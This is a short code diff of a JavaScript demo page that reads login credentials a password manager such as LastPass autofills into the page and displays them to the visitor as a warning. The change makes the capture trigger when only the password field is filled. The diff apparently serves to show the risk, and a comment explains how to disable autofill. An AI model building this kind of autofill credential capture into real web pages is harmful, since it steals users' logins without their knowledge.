@@ -22,7 +22,7 @@
         async function go() {
             await sleep(500);
 
-            if (document.getElementById("username").value && document.getElementById("password").value) {
+            if (document.getElementById("password").value) {
                 lol.innerHTML = document.getElementById("username").value + '<br>' + document.getElementById("password").value
                 await sleep(500);
                 lol.innerHTML = lol.innerHTML + '<br><br>You could have just been haxed just by visiting this site!' // In lastpass, go to preferences/general and disable "Automatically Fill Login Information" It will get reenabled though...
